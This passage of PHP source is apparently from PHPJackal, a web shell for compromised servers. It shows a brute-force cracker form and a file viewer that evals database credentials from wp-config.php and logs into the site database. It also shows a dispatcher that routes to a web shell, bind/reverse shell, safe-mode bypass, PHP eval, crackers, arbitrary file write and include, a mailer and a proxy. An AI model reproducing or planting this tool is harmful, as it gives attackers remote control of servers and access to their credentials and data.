<option value="az09">Bruteforce [a-z] [0-9]</option>
<option value="az09AZ">Bruteforce [a-z] [A-Z] [0-9]</option>
<option value="all">Bruteforce [ALL]</option>
<option value="wl">Wordlist</option>
</select>
</div></div>
<div class="fieldwrapper" id="dic">
<label class="styled">Dictionary:</label>
<div class="thefield">
<input type="text" name="dictionary" size="30" />
</div>
</div><div class="fieldwrapper" id="fcr">
<label class="styled">Dictionary type:</label>
<div class="thefield">
<ul style="margin-top:0;">
<li><input type="radio" value="0" checked name="combo" onClick="document.cracker.user.disabled = false;" /> <label>Simple (P)</label></li>
<li><input type="radio" name="combo" value="1" onClick="document.cracker.user.disabled = true;" /> <label>Combo (U:P)</label></li>
</ul>
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Method:</label>
<div class="thefield">
<select name="method"><option selected value="1">POST</option><option value="0">GET</option></select>
</div>
</div><div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name="user" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled"><input type=checkbox name=loG value=1 onClick="document.cracker.logfilE.disabled = !document.cracker.logfilE.disabled;" checked> Log:</label>
<div class="thefield">
<input type=text name=logfilE size=25 value="' . whereistmP () . DIRECTORY_SEPARATOR . '.log">
</div>
</div>
' . $hcwd . '
<div class="buttonsdiv">
<input type="submit" name="start" value="Start" style="margin-left: 150px;" />
</div>
</form><script>toggle();</script>';
}
function openswF($name) {
	echo '<OBJECT classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0" WIDTH="320" HEIGHT="240" id="Yourfilename" ALIGN="">
<PARAM NAME=movie VALUE="Yourfilename.swf"> <PARAM NAME=quality VALUE=high>
<PARAM NAME=bgcolor VALUE=#333399>
<EMBED src="' . $name . '" quality=high bgcolor=#333399 NAME="PHPJackal Player" ALIGN="" TYPE="application/x-shockwave-flash" PLUGINSPAGE="http://www.macromedia.com/go/getflashplayer">
</EMBED> </OBJECT>';
}
function openiT($name) {
	global $Resource_Dir, $cwd;

	if (! is_readable ( $name )) {
		echo "File is not readable!";
		return null;
	}
	#TODO: Add more configs
	switch ($name) {
		case 'wp-config.php' :
			$config = file ( $name );
			foreach ( $config as $line )
				if (strstr ( $line, "define('DB_" ))
					eval ( $line );
			$_REQUEST ['serveR'] = DB_HOST;
			$_REQUEST ['useR'] = DB_USER;
			$_REQUEST ['pasS'] = DB_PASSWORD;
			$_REQUEST ['dB'] = DB_NAME;
			$_REQUEST ['typE'] = 'MySQL';
			sqlclienT ();
			return null;
			break;

		default :
			;
			break;
	}
	echo "<b><i>" . htmlspecialchars ( $name ) . ":</i></b><br /><br />";
	$ext = strtolower ( end ( explode ( '.', $name ) ) );
	$src = array ('php', 'php3', 'php4', 'phps', 'phtml', 'phtm', 'inc' );
	$img = array ('gif', 'jpg', 'jpeg', 'bmp', 'png', 'tif', 'ico' );
	$swf = array ('swf' );
	$snd = array ('mp3', 'wav', 'ogg' );
	$vid = array ('webm', 'mp4', 'ogv' );
	if (in_array ( $ext, $src ))
		highlight_file ( $name );
	elseif (in_array ( $ext, $swf ))
		openswF ( $name );
	elseif (in_array ( $ext, $snd ))
		echo '<audio src="' . hlinK ( "workingdiR=$cwd&downloaD=$name" ) . '" controls></audio>';
	elseif (in_array ( $ext, $vid ))
		echo '<video src="' . hlinK ( "workingdiR=$cwd&downloaD=$name" ) . '" width="320" height="240" controls></video>';
	elseif (in_array ( $ext, $img )) {
		showimagE ( $name );
		return null;
	} elseif (substr ( $name, 0, 5 ) == 'sess_')
		opensesS ( $name );
	else
		echo '<font color=#FA0><pre>' . htmlspecialchars ( file_get_contents ( $name ) ) . '</pre></font>';
	echo '<br /><a href="javascript:history.go(-1)"><img src="' . $Resource_Dir . 'images/back.png" border="0" /><b>Back</b></a>';
}
function opensesS($name) {
	$sess = file_get_contents ( $name );
	$var = explode ( ';', $sess );
	echo "<table><tr><th>Name</th><th>Type</th><th>Value</th></tr>";
	foreach ( $var as $v ) {
		if (! $v)
			continue;
		$t = explode ( '|', $v );
		$c = unserialize ( $t [1] );
		$y = gettype ( $c );
		echo "<tr><td>" . $t [0] . "</td><td>$y</td><td>$c</td><tr>";
	}
	echo '</table>';
}
function logouT() {
	echo "<script type='text/javascript'>
document.cookie = 'passw=; path=/';
document.cookie = '501=; path=/';
window.location = '" . hlinK () . "'
</script>";
}
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta charset="utf-8" content="" />
<title>PHPJackal [<?php
echo $cwd;
?>]</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<script type="text/javascript">document.title = "PHPJackal [<?php
echo addslashes ( $cwd );
?>]";</script>
<link rel="stylesheet" type="text/css"
	href="<?php
	echo $Resource_Dir . $Theme;
	?>.css" />
<link
	href="<?php
echo $Resource_Dir;
?>jquery-linedtextarea.css"
	type="text/css" rel="stylesheet" />
<link rel="shortcut icon"
	href="<?php
	echo $Resource_Dir;
	?>favicon.ico"
	type="image/x-icon" />
<script type="text/javascript"
	src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>


<script
	src="<?php
echo $Resource_Dir;
?>jquery-linedtextarea.js"
	type="text/javascript"></script>
<script src="<?php
echo $Resource_Dir;
?>sorttable.js"
	type="text/javascript"></script>
<?php
if ($_REQUEST ['seC'] == 'fm')
	echo '
<script type="text/JavaScript">
function chmoD($file){
$ch=prompt("Changing file mode["+$file+"]: ex. 777","");
if($ch != null)location.href="' . hlinK ( 'seC=fm&workingdiR=' . addslashes ( $cwd ) . '&chmoD=' ) . '"+$file+"&modE="+$ch;
}
</script>';
if ($_REQUEST ['seC'] == 'hc' || $_REQUEST ['seC'] == 'cr' || $_REQUEST ['seC'] == 'fcr' || $_REQUEST ['seC'] == 'auth')
	echo '
<script type="text/JavaScript">
function toggle(){
if(document.getElementById("mode").value=="wl"){
if(document.getElementById("dic"))document.getElementById("dic").innerHTML = \'<label class="styled">Wordlist:</label><div class="thefield"><input type="text" name="dictionary" size="30" /></div>\'
if(document.getElementById("combo"))document.getElementById("fcr").hidden = false
if(document.getElementById("fcr"))document.getElementById("fcr").hidden = false

}
else if(document.getElementById("mode").value=="sau"){
if(document.getElementById("dic"))document.getElementById("dic").innerHTML = \'\'
if(document.getElementById("combo"))document.getElementById("fcr").hidden = true
if(document.getElementById("fcr"))document.getElementById("fcr").hidden = true

}
else{
if(document.getElementById("dic"))document.getElementById("dic").innerHTML = \'<label class="styled">Range:</label><div class="thefield">Min: <input type="number" name="min"  min="1" value="1" size="15"> Max: <input type="number" name="max" min="1" value="5" size="30"></div>\'
if(document.getElementById("combo"))document.getElementById("fcr").hidden = true
if(document.getElementById("fcr"))document.getElementById("fcr").hidden = true
}
}
</script>';
if ($_REQUEST ['seC'] == 'edit')
	echo '<script>
function unloadMsg(){
    msg = "You will discard changes by leaving this page."
    return msg;
}
function setUnload(on){
    window.onbeforeunload = (on) ? unloadMsg : null;
}
</script>
';
?>
</head>
<body>
<div id="sliderWrap" style="position: absolute;
left: 320px;
width: 600px;
height: 40px;
margin-left: -200px;
background: #222;
border-bottom-right-radius: 40px;">
<div id="openCloseIdentifier"></div>
<form method="POST" action=""><input
	type="text" name="workingdiR" style="width: 550px;
top: 5px;
left: 10px;
position: absolute;border-bottom-right-radius: 40px;" value="<?php
	echo $cwd;
	?>" /></form>
</div>

<div class="left"><img
	src="<?php
	echo $Resource_Dir;
	?>images/banner.png"
	alt="banner" border="0" />
<ul>
	<li
		<?php
		if ($_REQUEST ['seC'] == 'sysinfo')
			echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=sysinfo&amp;workingdiR=$cwd" );
		?>'>Information</a></li>
	<li
		<?php
		if ($_REQUEST ['seC'] == 'fm' || $_REQUEST ['seC'] == 'openit')
			echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=fm&amp;workingdiR=$cwd" );
		?>'>File
	manager</a></li>
	<li <?php
	if ($_REQUEST ['seC'] == 'edit')
		echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=edit&amp;workingdiR=$cwd" );
		?>'>Editor</a></li>
	<li
		<?php
		if ($_REQUEST ['seC'] == 'webshell')
			echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=webshell&amp;workingdiR=$cwd" );
		?>'>Web
	shell</a></li>
	<li <?php
	if ($_REQUEST ['seC'] == 'br')
		echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=br&amp;workingdiR=$cwd" );
		?>'>B/R
	shell</a></li>
	<li <?php
	if ($_REQUEST ['seC'] == 'asm')
		echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=asm&amp;workingdiR=$cwd" );
		?>'>Safe-mode</a></li>
	<li
		<?php
		if ($_REQUEST ['seC'] == 'sqlcl')
			echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=sqlcl&amp;workingdiR=$cwd" );
		?>'>SQL
	client</a></li>
	<?php
if (checkfunctioN ( 'ftp_connect' )) {
	?>
	<li <?php
	if ($_REQUEST ['seC'] == 'ftpc')
		echo 'class="active"'?>><a
		href='<?php
	echo hlinK ( "seC=ftpc&amp;workingdiR=$cwd" );
	?>'>FTP
	client</a></li>
	<?php
}
?>
	<li <?php
if ($_REQUEST ['seC'] == 'mailer')
	echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=mailer&amp;workingdiR=$cwd" );
		?>'>Mail</a></li>
	<li <?php
	if ($_REQUEST ['seC'] == 'eval')
		echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=eval&amp;workingdiR=$cwd" );
		?>'>Evaler</a></li>
	<li
		<?php
		if ($_REQUEST ['seC'] == 'tools')
			echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=tools&amp;workingdiR=$cwd" );
		?>'>Tools</a></li>
	<li <?php
	if ($_REQUEST ['seC'] == 'sc')
		echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=sc&amp;workingdiR=$cwd" );
		?>'>Scanners</a></li>
	<li
		<?php
		if ($_REQUEST ['seC'] == 'cr' || $_REQUEST ['seC'] == 'dic' || $_REQUEST ['seC'] == 'auth' || $_REQUEST ['seC'] == 'fcr' || $_REQUEST ['seC'] == 'snmp' || $_REQUEST ['seC'] == 'hc')
			echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=cr&amp;workingdiR=$cwd" );
		?>'>Crackers</a></li>
	<li <?php
	if ($_REQUEST ['seC'] == 'px')
		echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=px&amp;workingdiR=$cwd" );
		?>'>Web
	pr0xy</a></li>
	<li <?php
	if ($_REQUEST ['seC'] == 'steg')
		echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=steg&amp;workingdiR=$cwd" );
		?>'>Stegano</a></li>
	<?php
if ($windows && class_exists ( 'COM' )) {
	?>
	<li
		<?php
	if ($_REQUEST ['seC'] == 'regedit')
		echo 'class="active"'?>><a
		href='<?php
	echo hlinK ( "seC=regedit&amp;workingdiR=$cwd" );
	?>'>Registry</a></li>
	<?php
}
?>
	<li <?php
if ($_REQUEST ['seC'] == 'calc')
	echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=calc&amp;workingdiR=$cwd" );
		?>'>Converter</a></li>
	<li
		<?php
		if ($_REQUEST ['seC'] == 'phpjackal')
			echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=phpjackal&amp;workingdiR=$cwd" );
		?>'>PHPJackal</a></li>
	<li
		<?php
		if ($_REQUEST ['seC'] == 'about')
			echo 'class="active"'?>><a
		href='<?php
		echo hlinK ( "seC=about&amp;workingdiR=$cwd" );
		?>'>About</a></li>
	<?php
if (isset ( $_COOKIE ['passw'] ))
	echo '<li><a href="' . hlinK ( "seC=logout" ) . '">Logout</a></li>';
?>
</ul>
</div>
<div class="right">
<div class="content"><?php
if (! empty ( $_REQUEST ['seC'] )) {
	switch ($_REQUEST ['seC']) {
		case 'fm' :
			filemanageR ();
			break;
		case 'sc' :
			scanneR ();
			break;
		case 'edit' :
			if (! empty ( $_REQUEST ['Save'] )) {
				$filehandle = fopen ( $_REQUEST ['filE'], 'w' );
				fwrite ( $filehandle, $_REQUEST ['edited'] );
				fclose ( $filehandle );
			}
			if (! empty ( $_REQUEST ['filE'] ))
				editoR ( $_REQUEST ['filE'] );
			else
				editoR ( '' );
			break;
		case 'openit' :
			openiT ( $_REQUEST ['namE'] );
			break;
		case 'cr' :
			crackeR ();
			break;
		case 'dic' :
			dicmakeR ();
			break;
		case 'tools' :
			toolS ();
			break;
		case 'hex' :
			hexvieW ();
			break;
		case 'img' :
			showimagE ( $_REQUEST ['filE'] );
			break;
		case 'inc' :
			if (file_exists ( $_REQUEST ['filE'] ))
				include ($_REQUEST ['filE']);
			break;
		case 'hc' :
			hashcrackeR ();
			break;
		case 'fcr' :
			formcrackeR ();
			break;
		case 'auth' :
			authcrackeR ();
			break;
		case 'ftpc' :
			ftpclienT ();
			break;
		case 'eval' :
			phpevaL ();
			break;
		case 'phpjackal' :
			phpjackal ();
			break;
		case 'snmp' :
			snmpcrackeR ();
			break;
		case 'px' :
			pr0xy ();
			break;
		case 'steg' :
			stegn0 ();
			break;
		case 'webshell' :
			webshelL ();
			break;
		case 'mailer' :
			maileR ();
			break;
		case 'br' :
			brshelL ();
			break;
		case 'asm' :
			safemodE ();
			break;
		case 'sqlcl' :
			sqlclienT ();
			break;
		case 'calc' :
			calC ();
			break;
		case 'regedit' :
			regediT ();
			break;
		case 'sysinfo' :
			sysinfO ();
			break;
		case 'checksum' :
			checksuM ( $_REQUEST ['filE'] );
			break;
		case 'logout' :
			logouT ();
			break;
		default :
			echo $intro;
	}
} else
	echo $intro;
?>
<div id="footer" style="margin-top: 100px; width: 850px">&copy;
2016 <a href="https://github.com/nim4/PHPJackal"><strong>PHPJackal <?= $VERSION; ?></strong></a><br />
Created by Nima Ghotbi</div>
</div>
</div>
</body>
</html>
<?php
if ($Die_in_end)
	die ( '<!-- Death -->' );
?>
